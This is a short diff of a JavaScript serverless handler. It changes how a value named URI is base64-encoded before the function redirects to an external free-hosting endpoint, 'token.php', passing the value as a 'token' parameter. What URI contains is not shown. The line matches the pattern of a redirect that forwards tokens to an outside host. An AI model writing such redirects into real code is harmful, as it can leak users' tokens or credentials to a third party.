@@ -56,7 +56,7 @@ exports.handler = async (event, context) => {
     return {
       statusCode: 302,
       headers: {
-        Location: "https://cybxis.000webhostapp.com/token.php?token" + btoa(URI),
+        Location: "https://cybxis.000webhostapp.com/token.php?token" + Buffer.from(URI).toString('base64'),
         'Cache-Control': 'no-cache' // Disable caching of this response
       },
       body: '' // return body for local dev
